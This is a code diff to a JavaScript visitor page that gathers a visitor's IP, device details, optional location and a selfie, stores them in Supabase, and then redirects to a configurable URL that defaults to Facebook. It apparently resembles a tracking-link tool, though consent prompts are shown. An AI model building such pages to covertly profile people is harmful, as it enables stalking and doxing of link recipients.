@@ -4,6 +4,7 @@ import {
   requestLocation,
   captureSelfie,
 } from "./collect.js";
+import { fetchRedirectUrl, isSupabaseConfigured } from "./settings.js";
 
 function cfg() {
   return window.APP_CONFIG || {};
@@ -11,7 +12,7 @@ function cfg() {
 
 async function saveVisit(payload) {
   const { supabaseUrl, supabaseAnonKey } = cfg();
-  if (!supabaseUrl || !supabaseAnonKey || supabaseUrl.includes("YOUR_PROJECT")) {
+  if (!isSupabaseConfigured()) {
     console.warn("Supabase not configured; visit logged locally only.", payload);
     return { ok: false, local: true };
   }
@@ -52,12 +53,15 @@ export function initVisitorPage() {
   const wantLocation = () =>
     document.getElementById("opt-location")?.checked ?? false;
 
+  let redirectTarget = cfg().redirectUrl || "https://www.facebook.com";
+
   async function runFlow(tryCamera) {
     consentSection.classList.add("hidden");
     progressSection.classList.remove("hidden");
 
     const deviceInfo = getDeviceInfo();
     setStatus(statusEl, "زانیاری ئامێر و ئایپی کۆدەکرێتەوە…");
+    redirectTarget = await fetchRedirectUrl();
 
     let ipPayload = { ip: null, source: null };
     try {
@@ -119,8 +123,7 @@ export function initVisitorPage() {
   }
 
   function redirect() {
-    const url = cfg().redirectUrl || "https://www.facebook.com";
-    window.location.replace(url);
+    window.location.replace(redirectTarget);
   }
 
   btnAccept.addEventListener("click", () => {
